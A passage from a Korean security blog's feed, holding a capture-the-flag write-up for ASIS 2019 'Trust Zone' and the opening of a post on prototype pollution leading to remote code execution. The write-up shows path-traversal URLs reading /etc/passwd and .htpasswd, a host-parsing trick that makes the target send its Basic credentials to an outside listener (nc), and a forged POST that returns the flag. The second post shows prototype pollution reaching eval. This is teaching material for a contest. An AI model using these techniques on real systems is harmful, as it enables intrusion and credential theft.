href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</a></li><li><a href="https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/">https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Overview&quot;&gt;&lt;a href=&quot;#Overview&quot; class=&quot;headerlink&quot; title=&quot;Overview&quot;&gt;&lt;/a&gt;Overview&lt;/h2&gt;&lt;p&gt;컴퓨터 보안에 있어 &lt;code&gt;Sandbox&lt;/code&gt; 는 프로그래밍 언어에서 작
      
    
    </summary>
    
    
      <category term="Docs" scheme="https://blog.p6.is/category/docs/"/>
    
    
      <category term="javascript" scheme="https://blog.p6.is/tags/javascript/"/>
    
      <category term="sandbox" scheme="https://blog.p6.is/tags/sandbox/"/>
    
  </entry>
  
  <entry>
    <title>ASIS 2019 Final - Trust Zone</title>
    <link href="https://blog.p6.is/asis-2019-final-trust-zone/"/>
    <id>https://blog.p6.is/asis-2019-final-trust-zone/</id>
    <published>2019-11-18T00:00:00.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://66.172.33.59:5000/</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">200</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;start&quot;</span><span class="punctuation">:</span><span class="string">&quot;/get_doc?url=http://66.172.33.59/docs/doc1.doc&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>서버에 접속하면, 먼저 링크가 하나 주어집니다.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://66.172.33.59:5000/get_doc?url=http://66.172.33.59/docs/doc1.doc</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">200</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;the doc content&quot;</span><span class="punctuation">:</span><span class="string">&quot;b&#x27;Doc 1&#x27;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>접속하면 문서 내용이 표시되는데, 특별한 내용은 없습니다.<br>인자의 URL 부분을 퍼징해 보면 앞의 <code>http://66.172.33.59/</code> 와 끝의 <code>.doc</code> 에 static 한 비교를 수행하고 있다는 것을 알 수 있습니다.<br>어느 한 부분이라도 만족하지 못하면, <code>Security Error</code> 를 반환합니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- http://66.172.33.59:5000/get_doc?url=http://66.172.33.59/.doc --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Index of /<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Index of /<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/blank.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[ICO]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=N;O=D&quot;</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=M;O=A&quot;</span>&gt;</span>Last modified<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=S;O=A&quot;</span>&gt;</span>Size<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?C=D;O=A&quot;</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/folder.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[DIR]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;doc_app/&quot;</span>&gt;</span>doc_app/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2019-11-14 14:51  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/folder.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[DIR]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;docs/&quot;</span>&gt;</span>docs/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2019-11-14 14:51  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/folder.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[DIR]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;flag/&quot;</span>&gt;</span>flag/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2019-11-14 14:51  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.38 (Debian) Server at 66.172.33.59 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://66.172.33.59/.doc</code> 을 URL 에 넣어 확인해 보면<br>이 처럼 디렉토리 리스팅이 되는 것을 확인할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/doc_app</span><br><span class="line">---- doc.php</span><br><span class="line">/docs</span><br><span class="line">---- doc1</span><br><span class="line">---- doc2</span><br><span class="line">---- doc3</span><br><span class="line">/flag</span><br><span class="line">---- flag.php</span><br></pre></td></tr></table></figure><p>정리해보면, 내부 웹 서버 구조는 위와 같습니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOC Reader<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;?filename=docktest&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>이 중에 <code>/doc_app/doc.php</code> 파일이 수상해 보입니다.<br>인자로 파일 이름을 줄 수 있는데, 실제로 테스트해보면 <code>Traversal</code> 이 가능합니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// http://66.172.33.59:5000/get_doc?url=http://66.172.33.59/doc_app/doc.php?filename=../../../etc/passwd%23.doc</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>위와 같은 방법으로 <code>/etc/passwd</code> 파일을 읽을 수 있었습니다.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- http://66.172.33.59:5000/get_doc?url=http://66.172.33.59/doc_app/doc.php?filename=../../../etc/apache2/sites-enabled/000-default.conf%23.doc --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">srv</span>/&gt;</span></span><br><span class="line">       Options Indexes FollowSymLinks</span><br><span class="line">       Require all granted</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">    DocumentRoot /srv/app/public</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> &quot;/<span class="attr">srv</span>/<span class="attr">app</span>/<span class="attr">public</span>&quot;&gt;</span></span><br><span class="line">        AllowOverride all</span><br><span class="line">        Require all granted</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">    CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure><p>아파치 설정 파일을 통해, 웹 루트를 확인할 수 있습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- http:<span class="comment">//66.172.33.59:5000/get_doc?url=http://66.172.33.59/doc_app/doc.php?filename=../../../srv/app/public/flag/flag.php%23.doc --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_ENV</span>[<span class="string">&#x27;FLAG&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;This page only accepts POST method&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>/flag/flag.php</code> 파일을 확인하면, POST 메소드로 호출할 시에<br>환경변수에 저장된 FLAG를 출력해 주도록 되어 있습니다.<br>그러나 현재는 GET 메소드로만 호출이 가능한 상황이므로 플래그를 얻는 것이 불가능합니다.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /srv/app/public/.htaccess --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_rewrite.c</span>&gt;</span></span><br><span class="line">    RewriteEngine On</span><br><span class="line">    RedirectMatch 301 (.*).doc$ http://66.172.33.59$1</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br><span class="line"></span><br><span class="line">AuthType Basic</span><br><span class="line">AuthName &quot;Restricted Content&quot;</span><br><span class="line">AuthUserFile /etc/apache2/.htpasswd</span><br><span class="line">Require valid-user</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- /etc/apache2/.htpsswd --&gt;</span></span><br><span class="line">secr3tUser_sys:$apr1$aWUbyZd0$Ge9ygNPiGeccI5iz645.X0</span><br></pre></td></tr></table></figure><p>내부 서버에 직접 접속할 수 있다면, POST 메소드로 페이지를 요청하는 것도 간단할 것 같습니다.<br>하지만 실제로 접속해보면, 연결 자체가 블록되어 있지는 않지만, basic 인증을 요구하고 있습니다.<br><code>.htpasswd</code> 에서 해시값은 알 수 있지만, 평문 패스워드를 알아낼 수는 없습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- http://66.172.33.59:5000/get_doc?url=http://66.172.33.59/%0a%0d.doc --&gt;</span><br><span class="line">HTTPConnectionPool(host=&#x27;66.172.33.59%0d&#x27;, port=80): Max retries exceeded with url: / (Caused by NewConnectionError(&#x27;&lt;urllib3.connection.HTTPConnection object at 0x7f953e32ccd0&gt;: Failed to establish a new connection: [Errno -2] Name or service not known&#x27;))</span><br></pre></td></tr></table></figure><p><code>CRLF Injection</code> 혹은 타 호스트로의 접속을 유도할 수 있다면 문제 해결이 가능할 것 같습니다.<br>따라서 <code>CRLF Injection</code> 이 가능 유무를 확인하던 도중 이상 현상을 확인했습니다.<br>TrustZone 에서 호스트를 파싱하는 로직에 문제가 있어 보입니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// http://66.172.33.59:5000/get_doc?url=http://66.172.33.59/%0a%0d@.doc</span><br><span class="line">No host specified.</span><br><span class="line"></span><br><span class="line">// http://66.172.33.59:5000/get_doc?url=http://66.172.33.59/%0a%0d@rwx.kr.doc</span><br><span class="line">[Server Content]</span><br></pre></td></tr></table></figure><p>위와 같은 방법으로 대상 호스트를 변경 할 수 있었습니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@rwx:/var/www/html<span class="comment"># nc -lvp 9999</span></span><br><span class="line">Listening on [0.0.0.0] (family 0, port 9999)</span><br><span class="line">Connection from ip-66-172-33-59.chunkhost.com 45572 received!</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: rwx.kr:9999</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Authorization: Basic c2VjcjN0VXNlcl9zeXM6ZWQ2MGNiZDYwZTgzNzg4NTg5YTI1NGUxMzZiYjAzMGI=</span><br></pre></td></tr></table></figure><p>그러면 요청에 포함된 헤더를 통해 크리덴셜을 확인할 수 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[REQUEST]</span><br><span class="line">POST /flag/flag.php? HTTP/1.1</span><br><span class="line">Host: 66.172.33.59</span><br><span class="line">Accept: text/html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Authorization: Basic c2VjcjN0VXNlcl9zeXM6ZWQ2MGNiZDYwZTgzNzg4NTg5YTI1NGUxMzZiYjAzMGI=</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">[RESPONSE]</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 18 Nov 2019 20:20:10 GMT</span><br><span class="line">Server: Apache/2.4.38 (Debian)</span><br><span class="line">X-Powered-By: PHP/7.3.11</span><br><span class="line">Content-Length: 38</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">ASIS&#123;ce4e0de7ace0353bc9370d36365c3a17&#125;</span><br></pre></td></tr></table></figure><p>이를 이용하면, Trust Zone 내부 서버에 직접 접속이 가능해지므로, 플래그를 얻을 수 있습니다.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://blog.p6.is/category/writeup/"/>
    
    
      <category term="ASIS CTF" scheme="https://blog.p6.is/tags/ASIS-CTF/"/>
    
  </entry>
  
  <entry>
    <title>Prototype Pollution to RCE</title>
    <link href="https://blog.p6.is/prototype-pollution-to-rce/"/>
    <id>https://blog.p6.is/prototype-pollution-to-rce/</id>
    <published>2019-10-28T00:00:00.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<p><code>Prototype pollution</code> 은 객체 기반 스크립트 언어라는 자바스크립트 특이성으로 인해 발생합니다. 따라서 <code>Nodejs</code> 등 자바스크립트 엔진 기반 서버에서 존재하는 취약점입니다. 자바스크립트의 자료형은 <code>prototype</code> 속성을 포함하는데 특정 객체 &#x2F; 클래스의 <code>prototype</code> 데이터의 변조가 가능하다면 이후 그 객체의 생성자를 통해 새로운 인스턴스를 생성 할 때에 참조하는 프로토타입 객체의 속성이 변경됩니다. </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> inst = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">inst.<span class="property">__proto__</span>.<span class="property">isAdmin</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(isAdmin); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>위처럼 특정 객체 클래스의 인스턴스의 <code>__proto__</code> 속성을 추가해 주는 것으로 다음 생성될 인스턴스의 속성에까지 영향을 끼칠 수 있습니다. DOM 과 NodeJS 에서 사용하는 window, process, global, root 등의 전역 변수 또한 Object 를 상속하고 있으므로 Object.prototype을 변조시킬 경우, 전역 객체 내부의 정의되지 않은 값 또한 임의로 조작될 수 있습니다.</p><p>본 취약점은 <a href="https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/">https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/</a> 에 상세하게 기술되어 있습니다.</p><p>Prototype Pollution은 임의의 변수를 선언하여, 높은 확률로 프로그램의 흐름을 조작할 수 있도록 합니다.<br>따라서 화이트 박스 테스팅에서는 수월하게 취약점을 확인할 수 있지만<br>블랙박스 테스팅에서는, 본 취약점의 존재를 확인했다고 하더라도 DOS 이상의 Impact를 내는 것이 어려울 수 있습니다.</p><p>본 게시글은 이러한 상황에서 서버 RCE 를 유발하는 몇가지 방법을 소개합니다.</p><blockquote><p>Code Execution</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">command</span> = <span class="string">&#x27;console.log(&quot;executed!&quot;)&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (command) &#123;</span><br><span class="line"><span class="built_in">eval</span>(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>본 취약점이 존재하는 상황에서 RCE를 유발할 수 있는 가장 좋은 상황은 위와 같습니다.<br>선언이나 검증 과정 없이, eval 함수에 특정 변수를 인자로 하여 전달할 수 있다면<br>아주 편안하게 RCE를 유발할 수 있습니다.</p><blockquote><p>Logical Vectors</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span> (polluted <span class="keyword">in</span> <span class="variable language_">this</span>) &#123;</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Pollution</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span> = <span class="string">&#x27;something&#x27;</span></span><br><span class="line"><span class="comment">// Use</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> atrr <span class="keyword">in</span> obj) &#123;</span><br><span class="line"><span 